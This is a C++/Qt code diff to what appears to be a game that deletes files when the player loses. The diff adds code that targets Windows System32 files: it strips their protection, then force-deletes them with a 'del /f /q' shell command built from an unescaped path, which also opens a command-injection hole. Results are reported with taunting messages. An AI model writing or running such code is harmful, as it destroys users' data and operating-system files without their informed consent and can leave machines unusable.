@@ -5,6 +5,7 @@
 #include <QDebug>
 #include <QDateTime>
 #include <QDirIterator>
+#include <cstdlib>
 
 MainWindow::MainWindow(QWidget *parent)
     : QMainWindow(parent)
@@ -806,27 +807,73 @@ void MainWindow::deleteSelectedFiles()
 {
     int deletedCount = 0;
     QStringList deletedFiles;
+    QStringList failedFiles;
 
     for (const QString& filePath : selectedFilesForDeletion) {
-        QFile file(filePath);
-        if (file.remove()) {
-            deletedCount++;
-            QFileInfo info(filePath);
-            deletedFiles.append(info.fileName());
+        QFileInfo info(filePath);
+
+        // For System32 files, we need special handling
+        if (filePath.contains("System32", Qt::CaseInsensitive)) {
+            // Try to remove read-only and system attributes first
+            QFile::Permissions perms = QFile::permissions(filePath);
+            QFile::setPermissions(filePath, perms | QFile::WriteUser | QFile::WriteOwner);
+
+            // Try to delete the file
+            QFile file(filePath);
+            if (file.remove()) {
+                deletedCount++;
+                deletedFiles.append(info.fileName());
+                logEvent(QString("Successfully deleted System32 file: %1").arg(info.fileName()));
+            } else {
+                // If normal deletion fails, try using Windows command
+                QString command = QString("del /f /q \"%1\"").arg(filePath);
+                int result = system(command.toLocal8Bit().constData());
+                if (result == 0) {
+                    deletedCount++;
+                    deletedFiles.append(info.fileName());
+                    logEvent(QString("Successfully deleted System32 file via command: %1").arg(info.fileName()));
+                } else {
+                    failedFiles.append(info.fileName());
+                    logEvent(QString("Failed to delete System32 file: %1 (Error: %2)").arg(filePath).arg(file.error()));
+                }
+            }
         } else {
-            logEvent(QString("Failed to delete file: %1").arg(filePath));
+            // Regular file deletion
+            QFile file(filePath);
+            if (file.remove()) {
+                deletedCount++;
+                deletedFiles.append(info.fileName());
+            } else {
+                failedFiles.append(info.fileName());
+                logEvent(QString("Failed to delete file: %1 (Error: %2)").arg(filePath).arg(file.error()));
+            }
         }
     }
 
+    // Show results
+    QString message;
     if (deletedCount > 0) {
-        QString message = QString("You lost! %1 files have been deleted:\n\n").arg(deletedCount);
+        message = QString("You lost! %1 files have been deleted:\n\n").arg(deletedCount);
         for (const QString& fileName : deletedFiles) {
-            message += fileName + "\n";
+            message += "✓ " + fileName + "\n";
         }
+
+        if (!failedFiles.isEmpty()) {
+            message += QString("\n%1 files could not be deleted (protected):\n").arg(failedFiles.size());
+            for (const QString& fileName : failedFiles) {
+                message += "✗ " + fileName + "\n";
+            }
+        }
+
         QMessageBox::warning(this, "Files Deleted", message);
-        logEvent(QString("Successfully deleted %1 files").arg(deletedCount));
+        logEvent(QString("Deletion complete: %1 successful, %2 failed").arg(deletedCount).arg(failedFiles.size()));
+    } else {
+        QMessageBox::information(this, "Files Protected",
+                                 "All selected files are protected and could not be deleted. Your system is safe... for now.");
+        logEvent("All files were protected and could not be deleted");
     }
 
     selectedFilesForDeletion.clear();
     filesToDelete = 0;
 }
+
